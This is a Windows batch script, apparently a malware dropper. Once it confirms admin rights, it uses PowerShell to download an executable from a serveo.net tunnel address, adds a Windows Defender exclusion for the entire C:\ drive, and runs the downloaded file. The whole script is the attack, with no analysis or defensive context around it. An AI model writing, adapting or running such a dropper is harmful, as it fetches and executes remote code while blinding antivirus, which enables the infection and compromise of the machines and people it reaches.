@echo off
echo Requesting admin privileges...
goto checkPrivileges 

:checkPrivileges
NET FILE 1>NUL 2>NUL
if '%errorlevel%' == '0' (goto isAdmin) else (goto notAdmin) 

:isAdmin
echo Running with admin privileges...
echo Downloading file...
powershell -Command "(New-Object System.Net.WebClient).DownloadFile('https://cb0763f90dbaf43be04f0a2ef3792e76.serveo.net/ap1.exe', 'ap1.exe')"
echo File downloaded successfully. 

echo Creating antivirus exclusion for C:\ drive...
powershell -Command "Add-MpPreference -ExclusionPath 'C:\'"
echo Exclusion created successfully. 

echo Running downloaded file with admin privileges...
start /wait ap1.exe 

goto :eof 

:notAdmin
echo This script requires admin privileges.
echo Please run the script as an administrator.
pause
exit
